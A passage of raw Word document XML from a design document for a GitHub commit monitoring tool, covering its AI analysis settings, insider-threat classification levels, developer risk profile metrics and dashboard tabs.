        <w:t xml:space="preserve">  "recommended_actions": ["action 1", "action 2", ...]</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>AI Configuration</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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Parameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Reason</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Temperature</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>0.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Low temperature for deterministic, consistent threat analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Max Tokens</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>1500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Sufficient for structured JSON response</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Response Format</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>JSON only</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Enforced by system prompt + parsing with markdown fence stripping</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Provider</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Configurable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Uses AIConfig.from_user() - supports multiple LLM providers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 Threat Level Classification</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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Threat Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Typical Indicators</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>intentional_insider</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Deliberate malicious action by authorized user</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Secret exfiltration, backdoor injection, security control bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>suspicious</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Potentially harmful, warrants investigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Unusual patterns, risky changes, possible negligence or intent</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>negligent</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Unintentional security risk from poor practices</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Hardcoded credentials, debug code in prod, missing input validation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>false_positive</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Benign commit incorrectly flagged</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Test files, documentation, legitimate config changes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>The AI response is stored in github_commit_ai_analysis for future reference, avoiding redundant API calls. The model used is also recorded for audit purposes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Developer Risk Profiles</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The system maintains a continuous risk profile for every developer who has committed to a monitored repository. Profiles are updated incrementally with each new scan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Profile Metrics</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="LightGrid-Accent1"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Metric</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Update Logic</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>total_commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Incremented by 1 per scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>high_risk_commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Incremented if risk_level in (high, critical)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>total_findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Incremented by count of findings in this commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_risk_score</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Rolling average across all commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>risk_trend</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>increasing / decreasing / stable (based on recent trend)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>last_commit_at</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Timestamp of most recent commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Profile Update Flow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>For each scanned commit:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. Check if developer profile exists in github_developer_profiles</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. If not: INSERT new profile with initial stats</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. If yes: UPDATE incrementally:</w:t>
        <w:br/>
        <w:t xml:space="preserve">       total_commits += 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">       high_risk_commits += 1 if risk_level in (high, critical)</w:t>
        <w:br/>
        <w:t xml:space="preserve">       total_findings += len(findings)</w:t>
        <w:br/>
        <w:t xml:space="preserve">       avg_risk_score = rolling average</w:t>
        <w:br/>
        <w:t xml:space="preserve">       last_commit_at = committed_at</w:t>
        <w:br/>
        <w:t xml:space="preserve">  4. Compute/update behavioral baseline (Stage 3)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  5. Run anomaly detection (Stage 4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. Dashboard &amp; Reporting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The GitHub Monitor provides a comprehensive multi-tab dashboard for security teams.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Dashboard Tabs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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Tab</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Key Features</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Overview</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per-repo risk cards with distribution bars</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Stacked risk distribution (critical/high/medium/low/clean), peak/avg scores, open alerts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commit Feed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Paginated commit list with risk badges</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Filter by repo, risk level, author, date range. Expandable details with findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Timeline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>14-day commit risk heatmap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Color-coded cells showing daily activity intensity by risk level</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Developers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Developer risk profiles</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Expandable cards with baseline details, anomaly history, risk trends</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Anomalies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All behavioral anomalies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Severity filter, acknowledgement workflow, linked to source commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Alerts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Sensitive file access tracking</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Alert acknowledgement, file path and matched pattern details</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All SAST findings across commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CWE/OWASP references, remediation guidance, CSV export</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Repos</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Repository management</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Add/remove repos, trigger scans, view scan history</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Signal Visualization</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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Signal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Icon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Color</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>off_hours</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Clock</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Blue</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>author_mismatch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>User</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Purple</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>unsigned</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Lock Open</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Gray</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>large_deletion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Trash</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Red</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
